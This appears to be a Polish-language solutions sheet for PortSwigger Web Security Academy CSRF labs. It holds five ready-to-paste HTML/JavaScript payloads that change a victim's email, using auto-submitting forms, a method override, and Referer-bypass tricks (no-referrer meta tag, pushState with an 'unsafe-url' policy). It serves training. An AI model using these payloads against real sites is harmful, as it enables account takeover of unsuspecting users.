
# Rozwiązania

W każdym z laboratoriów należy zalogować się na konto peter:wiener oraz wykonać akcję zmiany emaila żeby zdobyć URL z ID swojego laba.
Będzie on wyglądał w taki sposób: 

```
https://$ID_Laba$.web-security-academy.net/my-account/change-email 
```

w payloadach będzie to oznaczane jako:

```
$lab_url/change-email$ 
i $lab_url$
```

W następnym kroku należy przejść do strony exploit server i stworzyć odpowiedni formularz i kod w html i js, żeby wykonać atak csrf.
Upewnij się że email który jest w exploit serverze nie jest taki sam jak twój email konta "peter".

# Gotowe Payloady

## lab 1

```html
<form method="POST" action="$lab_url/change-email$">
    <input type="hidden" name="email" value="zmienionymail@gmail.com">
</form>
<script>
        document.forms[0].submit();
</script>
```

## lab 2

```html
<form action="$lab_url/change-email$">
    <input type="hidden" name="email" value="zmienionymail@gmail.com">
</form>
<script>
        document.forms[0].submit();
</script>
```

## lab 3

```html
<script>
    document.location = "$lab_url/change-email$?email=pwned@web-security-academy.net&_method=POST";
</script>
```

## lab 4

```html
<meta name="referrer" content="no-referrer">

<form method="POST" action="$lab_url/change-email$">
    <input type="hidden" name="email" value="zmienionymail@gmail.com">
</form>
<script>
        document.forms[0].submit();
</script>
```

## lab 5

```html
<form method="POST" action="$lab_url/change-email$">
    <input type="hidden" name="email" value="mail@gmail.com">
</form>
<script>
    history.pushState("", "", "/?$lab_url$")
    document.forms[0].submit();
</script>
```

I to w Head:

```html
Referrer-Policy: unsafe-url
```
